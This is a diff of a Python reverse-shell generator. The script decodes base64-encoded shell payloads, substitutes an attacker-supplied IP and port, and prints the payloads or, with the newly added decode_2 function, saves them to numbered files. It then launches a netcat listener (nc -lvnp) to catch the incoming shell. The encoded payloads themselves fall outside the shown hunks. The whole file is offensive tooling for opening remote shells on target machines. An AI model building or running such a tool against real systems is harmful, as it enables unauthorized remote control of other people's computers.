@@ -1,5 +1,6 @@
 #!/usr/bin/python3
 # coding=utf-8
+
 import requests
 import subprocess
 import base64
@@ -23,13 +24,15 @@ shells = {
 
 
 
+
 #function for decode 
-def decode():     
+def decode_1():     
 
     shell_type = sys.argv[1]
     ip_addr = sys.argv[2]
     port_number = sys.argv[3]
     count=0
+
 
     for payload in shells:
         if payload == shell_type:
@@ -40,6 +43,32 @@ def decode():
                 R_ip = dcode.replace("your_ip",ip_addr)
                 R_port = R_ip.replace("your_port",port_number)
                 print(colored(R_port,"white",attrs=['bold']))
+                
+
+
+
+def decode_2():     
+
+    shell_type = sys.argv[1]
+    ip_addr = sys.argv[2]
+    port_number = sys.argv[3]
+    count=0
+    print(colored("Enter file name: ",'white',attrs=['bold']))
+    file_name = input(str())
+
+
+    for payload in shells:
+        if payload == shell_type:
+            print("\033[1;92m"+"[*] Your ShellCode saved in file named "+file_name+": \n")
+            for i in shells[payload]:
+                count+=1
+               
+                dcode = base64.b64decode(i).decode('utf-8')
+                R_ip = dcode.replace("your_ip",ip_addr)
+                R_port = R_ip.replace("your_port",port_number)
+                with open(str(count)+"_"+file_name,'w') as f:
+                    print(colored(R_port,"white",attrs=['bold']), file=f)
+
 
 
 #banner
@@ -90,9 +119,12 @@ if __name__ == "__main__":
         sys.exit(1)
 
     banner()
-         
-    decode()
+    print(colored("Do you want save output in a file or not ?  [y/n] \n","white",attrs=['bold']))
+    file = input(str())
+    if file =='y' or file == "Y":
+        decode_2()
+    else:
+        decode_1()
     print(colored("-"*63+"[listening start on"+" --> "+ str(sys.argv[2])+":" + str(sys.argv[3])+"]"+"-"*63,"yellow",attrs=['bold']))
     print('\n')
     subprocess.run(["/usr/bin/nc","-lvnp",sys.argv[3]])
-
